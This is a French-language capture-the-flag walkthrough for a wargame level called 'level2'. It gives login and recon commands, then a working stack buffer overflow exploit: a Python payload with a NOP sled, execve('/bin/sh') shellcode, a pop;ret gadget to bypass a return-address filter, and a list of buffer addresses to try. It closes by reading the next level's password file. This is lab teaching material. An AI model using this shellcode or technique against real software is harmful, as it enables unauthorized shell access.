# Level2 — Commandes

## Connexion

```bash
ssh level2@localhost -p 4242
```

Mot de passe : (dans `level1/flag`)

---

## Recon

```bash
pwd
ls -la
file level2
readelf -h level2
```

Extraction (depuis l’hôte) :

```bash
cd level2
sshpass -p '<level2_password>' scp -o StrictHostKeyChecking=no -P 4242 level2@localhost:level2 ./level2.bin
```

Analyse locale : `strings`, `readelf -s`, `objdump -d`. Voir `analysis.md`.

---

## Exploitation

Le binaire n’a pas `system`. Overflow dans `p()` avec filtre sur l’adresse de retour (interdiction 0xb0...). On utilise un gadget `pop; ret` (0x08048385) et du shellcode dans le buffer.

Shellcode execve("/bin/sh") classique (sans \x00 ni \n), ex. 28 octets :

```python
# Python 2 sur la VM
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
```

Payload avec **NOP sled** (pour tolérer une adresse approximative). Si tu as « Illegal instruction », l’adresse du buffer est fausse : le CPU exécute du padding ou des octets d’adresse. Essaie les adresses listées ci‑dessous.

```bash
( python -c '
import struct
NOP = "\x90"
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
# NOP sled 40 octets pour élargir la cible
nopsled = NOP * 40
pad = 80 - len(nopsled) - len(shellcode)
buf_addr = 0xbffff700   # essayer 0xbffff5e0, 0xbffff600, 0xbffff650, 0xbffff700 si ça échoue
gadget = 0x08048385
payload = nopsled + shellcode + "A"*pad + struct.pack("<I", gadget) + struct.pack("<I", buf_addr) + struct.pack("<I", buf_addr)
print payload
'; cat ) | ./level2
```

**Adresses à tester** (une par une) si « Illegal instruction » ou rien :  
`0xbffff5e0`, `0xbffff600`, `0xbffff650`, `0xbffff6a0`, `0xbffff6c0`, `0xbffff700`, `0xbffff750`.

---

## Récupération du mot de passe level3

Dans le shell : `cat /home/user/level3/.pass`. Noter dans `level2/flag`.
